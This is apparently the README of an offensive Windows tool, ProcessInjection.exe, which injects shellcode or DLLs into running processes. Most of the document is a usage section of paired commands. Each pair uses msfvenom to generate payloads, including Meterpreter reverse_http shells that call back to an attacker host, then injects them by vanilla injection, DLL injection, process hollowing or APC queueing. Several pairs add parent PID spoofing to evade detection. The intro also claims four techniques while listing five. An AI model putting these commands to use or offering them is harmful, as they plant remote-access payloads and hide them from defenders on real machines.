# ProcessInjection

----

The program is designed to perform process injection.
Currently the tool supports 4 process injection techniques.

	1) Vanila Process Injection
	2) DLL Injection
	3) Process Hollowing
	4) APC Queue
	5) Vanula Process Injection (Dynamic Invoke)

Vanila Process Injection
Currently the tool accepts shellcode in 3 formats.

	1) base64
	2) hex
	3) C

Supports 1 detection evading technique.

	1) Parent PID Spoofing
	

### Command Line Usage

	Generating shellcode in base64 format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" | base64
	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:base64 /t:1

	Generating shellcode in hex format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex
	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:hex /t:1

	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f c
	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:1

	DLL Injection
	Generating DLL and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f dll > Desktop/calc.dll
	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\calc.dll" /t:2
	
	Process Hollowing
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
	
	APC Queue
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:7

	Vanila Process Injection (Dynamic Invoke)
	All shellcode formats are supported
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f c
	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:9

	Detection Evading Technique

	Parent PID Spoofing with Vanila Process Injection.
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:4

	Parent PID Spoofing with DLL Injection.
	Generating DLL and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f dll > Desktop/reverse_shell.dll
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\reverse_shell.dll" /parentproc:explorer /t:5
	
	Parent PID Spoofing with Process Hollowing.
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:6

	Parent PID Spoofing with APC Queue.
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:8

	Parent PID Spoofing with Vanila Process Injection (Dynamic Invoke).
	Generating shellcode in c format and injecting it in the target process.
	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:10


### Blog Post

[https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html](https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html)

[https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html](https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html)

[https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html](https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html)

[https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e](https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e)

[https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html](https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html)


### Contribution Credit

[Renos](https://twitter.com/r3n_hat)

[The Wover](https://twitter.com/TheRealWover) & [b33f](https://twitter.com/FuzzySec) for Dynamic Invoke - (https://thewover.github.io/Dynamic-Invoke/)

Credits also goes to [Aaron Bray](https://github.com/ambray) & [Rasta Mouse](https://twitter.com/_rastamouse) for Process Hollowing code
